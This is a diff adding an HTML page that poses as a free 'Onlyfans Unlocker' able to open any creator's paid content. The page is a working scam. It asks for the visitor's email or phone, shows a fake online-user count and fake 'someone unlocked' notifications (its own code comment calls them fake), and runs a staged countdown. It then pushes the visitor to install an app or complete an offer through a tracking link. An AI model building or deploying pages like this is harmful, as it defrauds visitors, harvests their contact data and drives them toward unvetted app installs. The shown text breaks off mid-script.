@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Onlyfans Viewer · View Onlyfans posts for free</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Onlyfans Viewer helps you discover public Onlyfans posts, creator profiles, previews, images, and updates in one place. Browse publicly available Onlyfans content quickly and easily.">
+    <meta name="keywords" content=" Onlyfans viewer, view Onlyfans posts, Onlyfans public posts, Onlyfans preview, Onlyfans profile viewer, Onlyfans creators, Onlyfans search, browse Onlyfans, Onlyfans posts online, Onlyfans public content, find Onlyfans creators, creator previews, Onlyfans media, Onlyfans images, Onlyfans videos, Onlyfans posts viewer, public Onlyfans viewer, Onlyfans discover, Onlyfans explorer, Onlyfans content search">
+    <meta name="robots" content="noindex, nofollow, max-image-preview:large">
+    <meta name="author" content="Onlyfans Viewer">
+    <link rel="canonical" href="https://imax083.github.io/">
+    <!-- Open Graph -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Onlyfans Viewer – View Public Onlyfans Posts & Creator Profiles">
+    <meta property="og:description" content="Discover public Onlyfans posts, creator previews, and profiles in one convenient place.">
+    <meta property="og:url" content="https://imax083.github.io/">
+    <meta property="og:image" content="https://imax083.github.io/android-chrome-192x192.png">
+    <meta property="og:site_name" content="Onlyfans Viewer">
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Onlyfans Viewer – View Public Onlyfans Posts">
+    <meta name="twitter:description" content="Browse public Onlyfans posts, creator previews, and profiles online.">
+    <meta name="twitter:image" content="https://imax083.github.io/android-chrome-192x192.png">
+    <meta name="theme-color" content="#0b0e1a" />
+
+    <!-- Favicon -->
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    
+    <!-- Apple -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="manifest" href="/manifest.json">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    /* ===== RESET & BASE ===== */
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-primary: #f1da68;
+      --bg-card: rgb(255 249 221 / 75%);
+      --bg-card-hover: rgba(28, 42, 72, 0.85);
+      --border-glow: rgba(99, 140, 255, 0.25);
+      --text-primary: #ff00bc;
+      --text-secondary: #0e0e0e;
+      --text-muted: #040404;
+      --accent-1: #c06cff;
+      --accent-2: #a78bfa;
+      --accent-3: #34d399;
+      --gradient-main: linear-gradient(135deg, #fffa0e, #ff5757);
+      --gradient-glow: linear-gradient(135deg, rgba(108, 140, 255, 0.3), rgba(167, 139, 250, 0.3));
+      --shadow-card: 0 20px 60px rgb(235 76 76 / 70%), 0 0 80px rgba(108, 140, 255, 0.08);
+      --radius: 24px;
+      --radius-sm: 14px;
+      --transition: 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    html {
+      font-size: 16px;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      background-image:
+        radial-gradient(ellipse at 20% 20%, rgba(108, 140, 255, 0.06) 0%, transparent 60%),
+        radial-gradient(ellipse at 80% 80%, rgba(167, 139, 250, 0.06) 0%, transparent 60%),
+        radial-gradient(ellipse at 50% 50%, rgba(52, 211, 153, 0.03) 0%, transparent 70%);
+      background-attachment: fixed;
+      overflow-x: hidden;
+    }
+
+    /* ===== ANIMATED BG PARTICLES ===== */
+    #bg-particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(108, 140, 255, 0.2), transparent 70%);
+      animation: floatParticle linear infinite alternate;
+      will-change: transform, opacity;
+    }
+    @keyframes floatParticle {
+      0% { transform: translate(0, 0) scale(0.8); opacity: 0.2; }
+      100% { transform: translate(30px, -40px) scale(1.2); opacity: 0.6; }
+    }
+
+    /* ===== MAIN CARD ===== */
+    .app-card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 480px;
+      background: var(--bg-card);
+      backdrop-filter: blur(24px) saturate(1.4);
+      -webkit-backdrop-filter: blur(24px) saturate(1.4);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-card);
+      padding: 32px 24px 28px;
+      transition: var(--transition);
+      animation: cardIn 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+    }
+
+    @keyframes cardIn {
+      0% { opacity: 0; transform: translateY(30px) scale(0.96); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* ===== HEADER ===== */
+    .app-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+    .app-icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 16px;
+      background: var(--gradient-main);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      color: #fff;
+      box-shadow: 0 8px 24px rgba(108, 140, 255, 0.3);
+      flex-shrink: 0;
+    }
+    .app-title {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.3px;
+      background: var(--gradient-main);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .app-sub {
+      font-size: 13px;
+      color: var(--text-secondary);
+      font-weight: 400;
+      margin-top: 2px;
+      -webkit-text-fill-color: var(--text-secondary);
+    }
+
+    /* ===== STATUS ROW ===== */
+    .status-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 8px;
+      background: rgb(255 97 83 / 35%);
+      border-radius: var(--radius-sm);
+      padding: 12px 10px;
+      margin-bottom: 24px;
+      border: 1px solid rgba(255, 255, 255, 0.04);
+    }
+    .status-item { text-align: center; }
+    .status-label {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--text-muted);
+      font-weight: 600;
+      display: block;
+    }
+    .status-value {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-top: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+    .status-value .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      display: inline-block;
+      animation: pulseDot 2s infinite;
+    }
+    .dot.online { background: var(--accent-3); box-shadow: 0 0 12px rgba(52, 211, 153, 0.5); }
+    @keyframes pulseDot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.8); }
+    }
+
+    /* ===== INTRO TEXT ===== */
+    .intro-text {
+      font-size: 15px;
+      line-height: 1.6;
+      color: var(--text-secondary);
+      text-align: center;
+      margin-bottom: 22px;
+      padding: 0 4px;
+    }
+    .intro-text strong { color: var(--text-primary); font-weight: 600; }
+
+    /* ===== INPUT GROUP ===== */
+    .input-group {
+      margin-bottom: 18px;
+    }
+    .input-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      margin-bottom: 8px;
+      letter-spacing: 0.02em;
+    }
+    .input-group .input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1.5px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-sm);
+      transition: var(--transition);
+      overflow: hidden;
+    }
+    .input-group .input-wrap:focus-within {
+      border-color: var(--accent-1);
+      box-shadow: 0 0 0 4px rgba(108, 140, 255, 0.15);
+    }
+    .input-group .input-wrap i {
+      position: absolute;
+      left: 16px;
+      color: var(--text-muted);
+      font-size: 16px;
+      pointer-events: none;
+      transition: var(--transition);
+    }
+    .input-group .input-wrap:focus-within i { color: var(--accent-1); }
+    .input-group input {
+      width: 100%;
+      padding: 16px 16px 16px 46px;
+      background: #ffc1516b;
+      border: none;
+      outline: none;
+      color: var(--text-primary);
+      font-size: 16px;
+      font-weight: 500;
+      font-family: inherit;
+    }
+    .input-group input::placeholder {
+      color: var(--text-muted);
+      font-weight: 400;
+      font-size: 15px;
+    }
+
+    /* ===== SUBSCRIPTION PLAN ===== */
+    .plan-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 18px;
+    }
+    .plan-btn {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1.5px solid rgba(255, 255, 255, 0.06);
+      border-radius: var(--radius-sm);
+      padding: 14px 6px;
+      text-align: center;
+      cursor: pointer;
+      transition: var(--transition);
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+    .plan-btn i { font-size: 18px; color: var(--text-muted); transition: var(--transition); }
+    .plan-btn span { font-size: 13px; font-weight: 700; }
+    .plan-btn small { font-size: 11px; color: var(--text-muted); font-weight: 400; }
+    .plan-btn:active { transform: scale(0.95); }
+    .plan-btn.active-plan {
+      background: rgba(108, 140, 255, 0.15);
+      border-color: var(--accent-1);
+      color: var(--text-primary);
+      box-shadow: 0 0 24px rgba(108, 140, 255, 0.08);
+    }
+    .plan-btn.active-plan i { color: var(--accent-1); }
+
+    /* ===== CONTENT TYPE GRID ===== */
+    .type-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 22px;
+    }
+    .type-btn {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1.5px solid rgba(255, 255, 255, 0.06);
+      border-radius: var(--radius-sm);
+      padding: 14px 6px;
+      text-align: center;
+      cursor: pointer;
+      transition: var(--transition);
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-weight: 500;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+    .type-btn i { font-size: 20px; color: var(--text-muted); transition: var(--transition); }
+    .type-btn span { font-size: 12px; font-weight: 600; }
+    .type-btn:active { transform: scale(0.95); }
+    .type-btn.active1 {
+      background: rgba(108, 140, 255, 0.12);
+      border-color: var(--accent-1);
+      color: var(--text-primary);
+      box-shadow: 0 0 24px rgba(108, 140, 255, 0.08);
+    }
+    .type-btn.active1 i { color: var(--accent-1); }
+
+    /* ===== BUTTON ===== */
+    .btn-main {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: var(--radius-sm);
+      background: var(--gradient-main);
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 8px 28px rgba(108, 140, 255, 0.25);
+      -webkit-tap-highlight-color: transparent;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-main::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 60%);
+      pointer-events: none;
+    }
+    .btn-main:active { transform: scale(0.97); box-shadow: 0 4px 16px rgba(108, 140, 255, 0.2); }
+    .btn-main i { font-size: 18px; }
+    .btn-main .pulse-ring {
+      position: absolute;
+      inset: -4px;
+      border-radius: inherit;
+      border: 2px solid rgba(108, 140, 255, 0.2);
+      animation: pulseRing 2.4s ease-out infinite;
+      pointer-events: none;
+    }
+    @keyframes pulseRing {
+      0% { transform: scale(1); opacity: 0.8; }
+      100% { transform: scale(1.08); opacity: 0; }
+    }
+    .btn-main:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    /* ===== LOADING INDICATOR ===== */
+    #loading-indicator {
+      text-align: center;
+      margin-top: 20px;
+      padding: 10px 0;
+    }
+    #loading-indicator .spinner {
+      font-size: 32px;
+      color: var(--accent-1);
+      animation: spin 1s linear infinite;
+      display: inline-block;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    #loading-indicator p {
+      color: var(--text-secondary);
+      margin-top: 10px;
+      font-weight: 500;
+      font-size: 15px;
+    }
+    .progress-track {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 4px;
+      margin-top: 14px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: var(--gradient-main);
+      border-radius: 4px;
+      transition: width 0.3s ease;
+    }
+    #countdown-timer {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-top: 8px;
+    }
+
+    /* ===== STEP VERIFY ===== */
+    #step-verify { margin-top: 6px; }
+    #step-verify .intro-text { margin-bottom: 18px; }
+    .verify-btn-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      margin-top: 8px;
+    }
+    .verify-btn-wrap .btn-main { max-width: 280px; margin: 0 auto; }
+    .spinner-icon {
+      font-size: 32px;
+      color: var(--accent-1);
+      animation: spin 1.2s linear infinite;
+      margin: 6px auto 10px;
+      display: block;
+      text-align: center;
+    }
+
+    /* ===== HIDE ===== */
+    .hide { display: none !important; }
+
+    /* ===== FOOTER ===== */
+    .footer-note {
+      margin-top: 18px;
+      font-size: 11px;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.5;
+      opacity: 0.7;
+      letter-spacing: 0.02em;
+      max-width: 380px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* ===== TOAST OVERRIDES ===== */
+    .vanillatoasts-toast {
+      border-radius: 14px !important;
+      font-family: 'Inter', sans-serif !important;
+      background: rgba(18, 28, 50, 0.92) !important;
+      backdrop-filter: blur(16px) !important;
+      border: 1px solid rgba(255, 255, 255, 0.06) !important;
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.6) !important;
+      color: var(--text-primary) !important;
+      padding: 14px 20px !important;
+    }
+    .vanillatoasts-toast .toast-title { font-weight: 700 !important; font-size: 15px !important; }
+    .vanillatoasts-toast .toast-text { font-size: 13px !important; color: var(--text-secondary) !important; }
+
+    /* ===== SWEETALERT OVERRIDES ===== */
+    .swal2-popup {
+      background: var(--bg-card) !important;
+      backdrop-filter: blur(24px) !important;
+      border: 1px solid rgba(255, 255, 255, 0.06) !important;
+      border-radius: var(--radius) !important;
+      color: var(--text-primary) !important;
+      font-family: 'Inter', sans-serif !important;
+      box-shadow: var(--shadow-card) !important;
+      padding: 28px 24px !important;
+    }
+    .swal2-title { color: var(--text-primary) !important; font-weight: 700 !important; font-size: 20px !important; }
+    .swal2-html-container { color: var(--text-secondary) !important; font-size: 15px !important; }
+    .swal2-confirm { border-radius: var(--radius-sm) !important; font-weight: 600 !important; font-family: 'Inter', sans-serif !important; background: var(--gradient-main) !important; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 420px) {
+      .app-card { padding: 24px 16px 20px; border-radius: 20px; }
+      .app-title { font-size: 19px; }
+      .app-icon { width: 48px; height: 48px; font-size: 22px; border-radius: 14px; }
+      .status-grid { padding: 10px 6px; gap: 4px; }
+      .status-value { font-size: 13px; }
+      .plan-btn, .type-btn { padding: 12px 4px; font-size: 12px; }
+      .plan-btn i, .type-btn i { font-size: 17px; }
+      .btn-main { font-size: 15px; padding: 14px; }
+      .intro-text { font-size: 14px; }
+      .input-group input { font-size: 15px; padding: 14px 14px 14px 42px; }
+      .input-group .input-wrap i { left: 14px; font-size: 14px; }
+    }
+    @media (max-width: 360px) {
+      .plan-grid, .type-grid { grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
+      .plan-btn, .type-btn { font-size: 11px; padding: 10px 2px; }
+      .plan-btn i, .type-btn i { font-size: 15px; }
+      .status-grid { grid-template-columns: 1fr 1fr 1fr; gap: 2px; font-size: 11px; }
+      .app-card { padding: 18px 12px 16px; }
+    }
+
+    /* scrollbar */
+    ::-webkit-scrollbar { width: 4px; height: 4px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--accent-1); border-radius: 8px; }
+  </style>
+</head>
+<body>
+
+  <!-- ===== BG PARTICLES ===== -->
+  <div id="bg-particles" aria-hidden="true"></div>
+
+  <!-- ===== MAIN CARD ===== -->
+  <div class="app-card">
+
+    <!-- HEADER -->
+    <div class="app-header">
+      <div class="app-icon"><i class="fas fa-robot"></i></div>
+      <div>
+        <div class="app-title">Onlyfans Unlocker</div>
+        <div class="app-sub"><i class="fas fa-bolt" style="font-size:10px;margin-right:4px;color:var(--accent-3);"></i> AI‑powered · free access</div>
+      </div>
+    </div>
+
+    <!-- STATUS -->
+    <div class="status-grid">
+      <div class="status-item">
+        <span class="status-label">Status</span>
+        <span class="status-value"><span class="dot online"></span> Online</span>
+      </div>
+      <div class="status-item">
+        <span class="status-label">Last Update</span>
+        <span class="status-value" id="date" style="font-size:13px;">—</span>
+      </div>
+      <div class="status-item">
+        <span class="status-label">Online Users</span>
+        <span class="status-value" id="online-count" style="font-size:15px;">—</span>
+      </div>
+    </div>
+
+    <!-- ===== STEP 1: MAIN ===== -->
+    <div id="step-main">
+      <p class="intro-text">
+        Unlock any <strong>Onlyfans</strong> account and view their content for free.
+        Enter the creator's username below.
+      </p>
+
+      <!-- username -->
+      <div class="input-group">
+        <label><i class="fas fa-user" style="margin-right:6px;color:var(--text-muted);"></i> Onlyfans Username</label>
+        <div class="input-wrap">
+          <i class="fas fa-search"></i>
+          <input type="text" id="usernameInput" placeholder="e.g. creator_name" autocomplete="off" />
+        </div>
+      </div>
+
+      <!-- ===== SUBSCRIPTION PLAN ===== -->
+      <label style="display:block;font-size:13px;font-weight:600;color:var(--text-secondary);margin-bottom:10px;letter-spacing:0.02em;">
+        <i class="fas fa-crown" style="margin-right:6px;color:var(--text-muted);"></i> Select Subscription Plan
+      </label>
+      <div class="plan-grid" id="planSelector">
+        <div class="plan-btn" data-plan="1month" onclick="selectPlan(this)">
+          <i class="fas fa-calendar-alt"></i>
+          <span>1 Month</span>
+          <small>FREE</small>
+        </div>
+        <div class="plan-btn active-plan" data-plan="3months" onclick="selectPlan(this)">
+          <i class="fas fa-calendar-check"></i>
+          <span>3 Months</span>
+          <small>FREE</small>
+        </div>
+        <div class="plan-btn" data-plan="6months" onclick="selectPlan(this)">
+          <i class="fas fa-calendar-plus"></i>
+          <span>6 Months</span>
+          <small>FREE</small>
+        </div>
+      </div>
+
+      <!-- ===== CONTENT TYPE ===== -->
+      <label style="display:block;font-size:13px;font-weight:600;color:var(--text-secondary);margin-bottom:10px;letter-spacing:0.02em;">
+        <i class="fas fa-layer-group" style="margin-right:6px;color:var(--text-muted);"></i> Content Type
+      </label>
+      <div class="type-grid" id="currency">
+        <div class="type-btn" data-type="videos" onclick="selectType(this)">
+          <i class="fas fa-video"></i><span>Videos</span>
+        </div>
+        <div class="type-btn" data-type="pictures" onclick="selectType(this)">
+          <i class="fas fa-image"></i><span>Pictures</span>
+        </div>
+        <div class="type-btn active1" data-type="all" onclick="selectType(this)">
+          <i class="fas fa-globe"></i><span>All types</span>
+        </div>
+      </div>
+
+      <!-- ===== EMAIL / NUMBER INPUT (new) ===== -->
+      <div class="input-group" style="margin-bottom:20px;">
+        <label><i class="fas fa-envelope" style="margin-right:6px;color:var(--text-muted);"></i> Email or Phone</label>
+        <div class="input-wrap">
+          <i class="fas fa-at"></i>
+          <input type="text" id="emailInput" placeholder="Enter your email or number to activate the subscription" autocomplete="off" />
+        </div>
+        <div style="font-size:12px;color:var(--text-muted);margin-top:6px;padding-left:4px;">
+          <i class="fas fa-info-circle"></i> Recommended: use a fresh email never used for Onlyfans.
+        </div>
+      </div>
+
+      <!-- Continue button (now leads to 10s wait → verify) -->
+      <button class="btn-main" id="btnContinue" onclick="handleContinue()">
+        <span class="pulse-ring"></span>
+        <i class="fas fa-arrow-right"></i>
+        <span>Continue</span>
+      </button>
+
+      <!-- LOADING INDICATOR -->
+      <div id="loading-indicator" class="hide">
+        <i class="fas fa-spinner spinner"></i>
+        <p>Processing, please wait...</p>
+        <div class="progress-track">
+          <div class="progress-fill" id="progress-fill"></div>
+        </div>
+        <span id="countdown-timer">10s</span>
+      </div>
+
+      <div class="footer-note">
+        <i class="fas fa-shield-alt" style="margin-right:4px;color:var(--accent-3);"></i>
+        <b>Trademark Notice:</b> Onlyfans is a trademark of its respective owner. This website is not affiliated with Onlyfans.
+        <p class="disclaimer-small-text">For more info, visit <a href="/terms-of-service.html">Terms of Service</a>.</p>
+      </div>
+    </div>
+
+    <!-- ===== STEP 2: VERIFY (hidden) ===== -->
+    <div id="step-verify" class="hide">
+      <div class="spinner-icon"><i class="fas fa-shield-halved"></i></div>
+      <p class="intro-text" style="margin-bottom:6px;">
+        <strong>Final Step</strong> Install an app or complete a short offer. It takes about 2 minutes. Once completed, you can continue to view and download.
+      </p>
+      <p style="font-size:13px;color:var(--text-muted);text-align:center;margin-bottom:18px;">
+        Click the button below and follow the instructions.
+      </p>
+      <div class="verify-btn-wrap">
+        <a rel="nofollow" href="https://trckapp.org/cl/i/o4m8l4" style="width:100%;max-width:280px;text-decoration:none;">
+          <button class="btn-main" onclick="_gu()" style="width:100%;">
+            <i class="fas fa-shield-check"></i>
+            <span>Verify Now</span>
+          </button>
+        </a>
+        <span style="font-size:12px;color:var(--text-muted);">
+          <i class="fas fa-clock" style="margin-right:4px;"></i> takes ~2 minutes
+        </span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ===== SCRIPTS ===== -->
+  <script>
+    // ============================================================
+    //  BG PARTICLES
+    // ============================================================
+    (function createParticles() {
+      const container = document.getElementById('bg-particles');
+      const count = 24;
+      for (let i = 0; i < count; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        const size = 4 + Math.random() * 10;
+        p.style.width = size + 'px';
+        p.style.height = size + 'px';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        p.style.animationDuration = (8 + Math.random() * 16) + 's';
+        p.style.animationDelay = (Math.random() * 10) + 's';
+        p.style.opacity = 0.15 + Math.random() * 0.25;
+        container.appendChild(p);
+      }
+    })();
+
+    // ============================================================
+    //  DATE & ONLINE COUNT
+    // ============================================================
+    document.getElementById('date').textContent = new Date().toDateString();
+    let onlineCount = 300 + Math.floor(Math.random() * 120);
+    document.getElementById('online-count').textContent = onlineCount;
+    setInterval(() => {
+      onlineCount += Math.floor(Math.random() * 7) - 3;
+      onlineCount = Math.max(120, onlineCount);
+      document.getElementById('online-count').textContent = onlineCount;
+    }, 1800);
+
+    // ============================================================
+    //  PLAN SELECTION
+    // ============================================================
+    let selectedPlan = '3months';
+
+    function selectPlan(el) {
+      document.querySelectorAll('.plan-btn').forEach(b => b.classList.remove('active-plan'));
+      el.classList.add('active-plan');
+      selectedPlan = el.dataset.plan || '3months';
+      if (navigator.vibrate) navigator.vibrate(6);
+    }
+
+    // ============================================================
+    //  CONTENT TYPE SELECTION
+    // ============================================================
+    let selectedType = 'all';
+
+    function selectType(el) {
+      document.querySelectorAll('.type-btn').forEach(b => b.classList.remove('active1'));
+      el.classList.add('active1');
+      selectedType = el.dataset.type || 'all';
+      if (navigator.vibrate) navigator.vibrate(6);
+    }
+
+    // ============================================================
+    //  TOAST (fake "someone unlocked" notification)
+    // ============================================================
+    const fakeNames = [
+      'LilSheep', 'Stefani4', 'EmileQueen', 'BeverlyK', 'ElenaGreat',
+      'Artur98', 'WorstGamer03', 'Abraham99', 'IrisBerry', 'CallMeAlexa',
+      'xManOnFire', 'Caprice05', 'Combat666', 'HailMary', 'DataMiner02',
+      'IdleKing', 'WatchForYoko', 'YasminFlower', 'HDstreaming', 'Hopeland97',
+      'Hylysackxx', 'ImBetterThanU', 'CarmeloLoco', 'WizardLucyMo', 'Anton177',
+      'AdahMoer', 'HondaLover', 'Francisco82', 'Roger2x', 'LetsTourAround',
+      'TkCombat', 'AntonSphere', 'Unitara54'
+    ];
+    const creditTexts = [' unlocked a Onlyfans account', ' viewed premium content', ' accessed a creator\'s feed'];
+
+    function showFakeToast() {
+      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+      const action = creditTexts[Math.floor(Math.random() * creditTexts.length)];
+      if (typeof VanillaToasts !== 'undefined') {
+        VanillaToasts.create({
+          title: name,
+          text: action,
+          type: 'success',
+          icon: 'https://imax083.github.io/img/profile.png',
+          timeout: 2800
+        });
+      }
+    }
+    setTimeout(showFakeToast, 2000);
+    setInterval(showFakeToast, 3500);
+
+    // ============================================================
+    //  AUDIO (light click & success)
+    // ============================================================
+    let audioCtx = null;
+
+    function playClick() {
+      try {
+        if (!audioCtx) audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.08);
+        osc.start(audioCtx.currentTime);
+        osc.stop(audioCtx.currentTime + 0.08);
+      } catch (_) { /* silent */ }
+    }
+
+    function playSuccess() {
+      try {
+        if (!audioCtx) audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+        [523, 659, 784].forEach((freq, i) => {
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(freq, audioCtx.currentTime + i * 0.1);
+          gain.gain.setValueAtTime(0.06, audioCtx.currentTime + i * 0.1);
+          gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + i * 0.1 + 0.12);
+          osc.start(audioCtx.currentTime + i * 0.1);
+          osc.stop(audioCtx.currentTime + i * 0.1 + 0.12);
+        });
+      } catch (_) {}
+    }
+
+    function playError() {
+      try {
+        if (!audioCtx) audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(300, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.25);
+        osc.start(audioCtx.currentTime);
+        osc.stop(audioCtx.currentTime + 0.25);
+      } catch (_) {}
+    }
+
+    // ============================================================
+    //  MAIN FLOW: Continue → validate → 10s load → show Verify
+    // ============================================================
+    let loadingTimer = null;
+    let progressInterval = null;
+
+    function handleContinue() {
+      const username = document.getElementById('usernameInput').value.trim();
+      const email = document.getElementById('emailInput').value.trim();
+
+      if (!username) {
+        const input = document.getElementById('usernameInput');
+        input.style.borderColor = '#f87171';
+        input.style.boxShadow = '0 0 0 4px rgba(248,113,113,0.15)';
+        playError();
+        if (typeof Swal !== 'undefined') {
+          Swal.fire({ icon: 'warning', title: 'Username required', text: 'Please enter a Onlyfans creator username.', confirmButtonColor: '#6c8cff', confirmButtonText: 'Got it', timer: 3000, timerProgressBar: true });
+        }
+        setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 800);
+        return;
+      }
+
+      if (!email) {
+        const input = document.getElementById('emailInput');
+        input.style.borderColor = '#f87171';
+        input.style.boxShadow = '0 0 0 4px rgba(248,113,113,0.15)';
+        playError();
+        if (typeof Swal !== 'undefined') {
+          Swal.fire({ icon: 'warning', title: 'Email or phone required', text: 'Please enter your email or number to activate the subscription.', confirmButtonColor: '#6c8cff', confirmButtonText: 'Got it', timer: 3000, timerProgressBar: true });
+        }
+        setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 800);
+        return;
+      }
+
+      // Play click
+      playClick();
+
+      // Disable button & show loading
+      const btn = document.getElementById('btnContinue');
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing…';
+
+      const loadingDiv = document.getElementById('loading-indicator');
+      loadingDiv.classList.remove('hide');
+
+      const progressFill = document.getElementById('progress-fill');
+      const countdownSpan = document.getElementById('countdown-timer');
+      let timeLeft = 10;
+      progressFill.style.width = '0%';
+      countdownSpan.textContent = timeLeft + 's';
+
+      if (progressInterval) clearInterval(progressInterval);
+      if (loadingTimer) clearTimeout(loadingTimer);
+
+      progressInterval = setInterval(() => {
+        timeLeft -= 0.1;
+        if (timeLeft <= 0) timeLeft = 0;
+        const percent = ((10 - timeLeft) / 10) * 100;
+        progressFill.style.width = Math.min(100, percent) + '%';
+        countdownSpan.textContent = Math.ceil(timeLeft) + 's';
+      }, 100);
+
+      loadingTimer = setTimeout(() => {
+        clearInterval(progressInterval);
+        progressInterval = null;
+        loadingDiv.classList.add('hide');
+        document.getElementById('step-main').classList.add('hide');
+        document.getElementById('step-verify').classList.remove('hide');
